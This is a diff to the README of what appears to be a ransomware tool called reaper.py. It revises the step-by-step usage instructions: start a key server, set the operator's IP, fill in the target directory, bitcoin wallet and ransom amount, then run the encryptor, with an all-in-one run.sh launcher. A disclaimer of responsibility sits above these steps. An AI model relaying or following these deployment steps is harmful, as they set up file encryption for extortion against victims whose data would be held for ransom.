@@ -25,10 +25,11 @@
 I take no responsibility, if the script was used in a bad manner.
 
 # How to use:
- - 1: Change the `DIR,TARGET_WALLET,AMOUNT_OF_BITCOIN,KEY` variables to make sure that your information is in the script.
- - 2: Run `create-key.py` to get an encryption key.
- - 3: Run `pip install -r requirements.txt` to get the libraries installed.
- - 4: Run `py reaper.py -t`.
+ - 1: Run `pip install -r requirements.txt` to get the libraries installed.
+ - 2: Start up `server.py`, so that incoming connections will get a key.
+ - 3: At `run.sh` change *192.168.0.90* to your IP.
+ - 4: Change the `DIR,TARGET_WALLET,AMOUNT_OF_BITCOIN,KEY` variables in `reaper.py` to make sure that your information is in the script.
+ - 5: Run `py reaper.py -t '[SERVER IP HERE]'`.
 
  - ALL IN ONE: Start `run.sh`. Pip and packages will be installed and the script will start.
 
